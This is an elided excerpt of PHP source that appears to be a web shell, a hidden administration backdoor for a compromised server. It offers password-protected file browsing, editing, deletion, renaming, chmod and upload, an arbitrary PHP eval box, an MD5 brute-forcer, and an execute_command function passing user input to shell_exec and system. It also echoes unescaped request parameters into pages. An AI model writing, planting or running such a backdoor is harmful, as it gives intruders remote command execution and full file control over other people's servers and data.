...
if (isset($_POST['pass'])) { //If the user made a login attempt, "pass" will be set eh?
    if (32 == strlen($password)) { //If the length of the password is 32 characters, threat it as an md5.
...
if (isset($_REQUEST['p'])) {
    switch ($_REQUEST['p']) {
            ...
            case 'edit': //Edit a fie
                ...
                echo 'Editing file <b>' . $_GET['file'] . '</b> (' . perm($_GET['file']) . ')<br><br><form action="' . $me . '?p=edit&file=' . $_GET['file'] . '&dir=' . realpath('.') . '" method=POST><textarea cols=90 rows=15 name="editform">';
            ...
            case 'delete': //Delete a file
                ...
                if (isset($_GET['file']) && file_exists($_GET['file']) && !isset($_POST['yes'])) {
                    echo 'Are you sure you want to delete ' . $_GET['file'] . '?<br>
            ...
            case 'eval': //Evaluate PHP code
                ...
                if (isset($_POST['eval'])) {
                    echo htmlspecialchars($_POST['eval']);
                } else {
                    echo 'print "Yo Momma";';
                }
                echo '</textarea><br>
            ...
            case 'chmod': //Chmod file
                ...
                if (isset($_POST['chmod'])) {
                    ...
                    echo 'Changed permissions on ' . $_POST['chmod'] . ' to ' . $_POST['chvalue'] . '.';
                }
                if (isset($_GET['file'])) {
                ...
                echo '<form action="' . $me . '?p=chmod&file=' . $content . '&dir=' . realpath('.') . '" method=POST><b>File to chmod:
...
<option value="755">755</option>
            ...
            case 'rename':
                ...
                echo 'Renaming ' . $file . ' in folder ' . realpath('.') . '.<br>
            ...
            if (isset($_POST['md5'])) {
                ...
                if (32 == strlen($_POST['md5'])) {
                    if ('9999' == $_POST['chars']) {
                        $i = 0;
                        while ($_POST['md5'] != md5($i) && 100000 != $i) {
                            ++$i;
                        }
                    } else {
                        for ($i = 'a'; 'zzzzz' != $i; ++$i) {
                    ...
                    if (md5($i) == $_POST['md5']) {
                        echo '<h1>Plaintext of ' . $_POST['md5'] . ' is <i>' . $i . '</i></h1><br><br>';
                    }
                }
            }

            echo 'Will bruteforce the md5
            ...
            foreach (getallheaders() as $header => $value) {
                echo htmlspecialchars($header . ':' . $value) . '<br>';
            }
            break;
        }
    ...
    echo '<table border=0 width=100%><td width=5% id=s><b>Options</b></td><td id=s><b>Filename</b></td><td id=s><b>Size</b></td><td id=s><b>Permissions</b></td><td id=s>Last modified</td><tr>';
    if ($handle = opendir('.')) {
        ...
        foreach ($directories as $file) {
            echo '<td id=d><a href="?p=rename&file=' . realpath($file) . '&dir=' . realpath('.') . '">[R]</a><a href="?p=delete&file=' . realpath($file) . '">[D]</a></td><td id=d><a href="' . $me . '?dir=' . realpath($file) . '">' . $file . '</a></td><td id=d></td><td id=d><a href="?p=chmod&dir=' . realpath('.') . '&file=' . realpath($file) . '"><font color=' . get_color($file) . '>' . perm($file) . '</font></a></td><td id=d>' . date('Y/m/d, H:i:s', filemtime($file)) . '</td><tr>';
        }

        foreach ($files as $file) {
            echo '<td id=f><a href="?p=rename&file=' . realpath($file) . '&dir=' . realpath('.') . '">[R]</a><a href="?p=delete&file=' . realpath($file) . '">[D]</a></td><td id=f><a href="' . $me . '?p=edit&dir=' . realpath('.') . '&file=' . realpath($file) . '">' . $file . '</a></td><td id=f>' . filesize($file) . '</td><td id=f><a href="?p=chmod&dir=' . realpath('.') . '&file=' . realpath($file) . '"><font color=' . get_color($file) . '>' . perm($file) . '</font></a></td><td id=f>' . date('Y/m/d, H:i:s', filemtime($file)) . '</td><tr>';
        }
    } else {
        echo "<u>Error!</u> Can't open <b>" . realpath('.') . '</b>!<br>';
    }

    echo '</table><hr><table border=0 width=100%><td><b>Upload file</b><br><form enctype="multipart/form-data" action="' . $me . '?dir=' . realpath('.') . '" method="POST">
...
function login()
{
    echo '<table border=0 width=100% height=100%><td valign="middle"><center>
...
function execute_command($method, $command)
{
    ...
    } elseif ('shell_exec' == $method) {
        echo shell_exec($command);
    } elseif ('system' == $method) {
        system($command);
    }
}
